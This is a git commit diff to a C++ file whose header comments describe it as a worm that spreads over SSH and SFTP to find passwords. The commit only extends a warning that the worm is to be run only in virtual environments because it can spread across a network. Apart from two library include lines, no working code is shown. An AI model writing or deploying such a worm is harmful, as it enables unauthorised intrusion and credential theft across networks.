07214bb130314d8643c00f87ac1cc354b426d4c3
apocalypse9949 <125962989+apocalypse9949@users.noreply.github.com>
2024-10-15 13:49:21 +0530

    Update Demon.cpp

--- Demon.cpp
+++ Demon.cpp
@@ -2,7 +2,7 @@
 //author - apocalypse9949(me)
 //description - WORM(Dracula) using SFTP and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
 //WARNING!!
-//This worm can only used in virtual env, please don't try to run this on your personal or work system
+//This worm can only used in virtual env, please don't try to run this on your personal or work system this can spread through your network
 
 #include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
 #include <libssh/sftp.h>    // SFTP library for file transfer.
